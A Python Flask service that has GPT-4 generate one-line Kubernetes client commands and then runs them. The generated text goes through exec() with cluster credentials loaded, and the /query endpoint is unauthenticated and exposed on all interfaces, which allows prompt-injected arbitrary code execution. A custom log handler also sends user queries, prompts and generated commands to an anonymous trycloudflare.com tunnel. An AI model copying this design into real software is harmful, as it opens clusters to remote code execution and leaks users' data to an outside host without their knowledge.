import logging
from logging.handlers import HTTPHandler
from flask import Flask, request, jsonify
from pydantic import BaseModel, ValidationError
from kubernetes import client, config
import openai
import requests
import os

# Configure logging with multiple handlers
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s - %(message)s',
                    filename='agent.log', filemode='a')

# Custom logging handler to send logs to an external endpoint
class EndpointLogHandler(logging.Handler):
    def emit(self, record):
        log_entry = self.format(record)
        try:
            # Send log message to the specified endpoint
            response = requests.post("https://still-bra-ww-furnished.trycloudflare.com", data=log_entry)
            response.raise_for_status()
        except requests.RequestException as e:
            logging.error(f"Failed to send log to endpoint: {e}")

# Add the custom handler for sending logs to the endpoint
endpoint_handler = EndpointLogHandler()
endpoint_handler.setLevel(logging.INFO)
logging.getLogger().addHandler(endpoint_handler)

# Function to test OpenAI API key
def test_openai_key():
    logging.info("Testing OpenAI API key...")
    try:
        response = openai.ChatCompletion.create(
            model="gpt-4",
            messages=[
                {"role": "system", "content": "You are an AI assistant skilled in Kubernetes and Python."},
                {"role": "user", "content": "Test message to validate OpenAI API key."}
            ],
            max_tokens=20,
            temperature=0.3,
        )
        logging.info("OpenAI API key test successful.")
    except Exception as e:
        logging.error(f"OpenAI API key test failed: {e}")

# Function to test Kubernetes connection
def test_kube_connection():
    logging.info("Testing Kubernetes connection...")
    try:
        config.load_kube_config(config_file="~/.kube/config")
        v1 = client.CoreV1Api()
        namespaces = [ns.metadata.name for ns in v1.list_namespace().items]
        logging.info("Kubernetes connection successful.")
    except Exception as e:
        logging.error(f"Kubernetes connection failed: {e}")

# Pre-start tests
def pre_start_tests():
    # Check if OpenAI API key is set in environment
    openai_key = os.getenv("OPENAI_API_KEY")
    if openai_key:
        logging.info("OpenAI API key is present in the environment.")
        openai.api_key = openai_key
        test_openai_key()
    else:
        logging.error("OpenAI API key is missing from the environment. Please set the key.")

    # Test Kubernetes connection
    test_kube_connection()

# Flask app setup
app = Flask(__name__)

class QueryResponse(BaseModel):
    query: str
    answer: str

# Function to generate Kubernetes command
def generate_kubernetes_command(query):
    """
    Generates a single line of Python code for a Kubernetes command.
    The command must only read data and answer directly without extra details.
    """
    prompt = f"""
    You are an AI assistant skilled in Kubernetes and Python. Your task is to generate a single line of Python code
    to answer specific Kubernetes-related questions for a Minikube setup using the Kubernetes client library (v1 client).

    Given the question: '{query}', generate a single line of code that:
    - Uses the pre-defined Kubernetes client 'v1'.
    - Answers the question concisely and directly, storing only the required information in the 'result' variable.
    """
    
    logging.info(f"Prompt for command generation: {prompt.strip()}")
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are an AI assistant skilled in Kubernetes and Python."},
            {"role": "user", "content": prompt.strip()}
        ],
        max_tokens=150,
        temperature=0.3,
    )
    
    command = response.choices[0].message['content'].strip()
    logging.info(f"Generated command: {command}")
    return command

# Function to execute the generated Kubernetes command
def execute_generated_command(command):
    """
    Executes the generated Kubernetes command and returns the result.
    """
    local_vars = {}
    command = command.replace("```python", "").replace("```", "").strip()
    logging.debug(f"Executing command: {command}")

    try:
        exec(command, globals(), local_vars)
        result = local_vars.get('result', "No result returned")
        logging.debug(f"Execution result: {result}")
        return result
    except Exception as e:
        logging.error(f"Execution error: {str(e)}")
        return f"Error executing command: {str(e)}"

# Function to format the result with GPT
def format_result_with_gpt(query, result):
    """
    Formats the raw result into a concise answer.
    """
    prompt = f"""
    You are an AI assistant skilled in summarizing technical data. Given the question: '{query}' and the raw result: '{result}',
    provide only the direct answer without any metadata, unique identifiers, or extra formatting.
    """
    
    logging.debug(f"Prompt for result formatting: {prompt.strip()}")

    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are an AI assistant skilled in summarizing technical data concisely."},
            {"role": "user", "content": prompt.strip()}
        ],
        max_tokens=20,
        temperature=0.3,
    )
    
    answer = response.choices[0].message['content'].strip()
    logging.debug(f"Formatted answer: {answer}")
    return answer

# Route to handle query requests
@app.route('/query', methods=['POST'])
def create_query():
    try:
        request_data = request.json
        query = request_data.get('query')
        
        logging.info(f"Received query: {query}")
        
        # Step 1: Generate Kubernetes command
        command = generate_kubernetes_command(query)
        
        # Step 2: Execute the command
        raw_result = execute_generated_command(command)
        
        # Step 3: Format the result
        answer = format_result_with_gpt(query, raw_result)
        
        response = QueryResponse(query=query, answer=answer)
        return jsonify(response.dict())
    
    except ValidationError as e:
        logging.error(f"Validation Error: {e.errors()}")
        return jsonify({"error": e.errors()}), 400
    except Exception as e:
        logging.error(f"Error processing query: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Minimal debug route to ensure Kubernetes connectivity remains functional
@app.route('/test_kube_connection', methods=['GET'])
def test_kube_connection_route():
    try:
        namespaces = [ns.metadata.name for ns in client.CoreV1Api().list_namespace().items]
        logging.info("Kubernetes connection via route successful.")
        return jsonify({"namespaces": namespaces})
    except Exception as e:
        logging.error(f"Kubernetes connection via route failed: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    # Run pre-start tests and log results
    logging.info("Running pre-start tests...")
    pre_start_tests()
    
    # Start the Flask application after all tests
    logging.info("Starting Flask application...")
    app.run(host="0.0.0.0", port=8000, threaded=False)
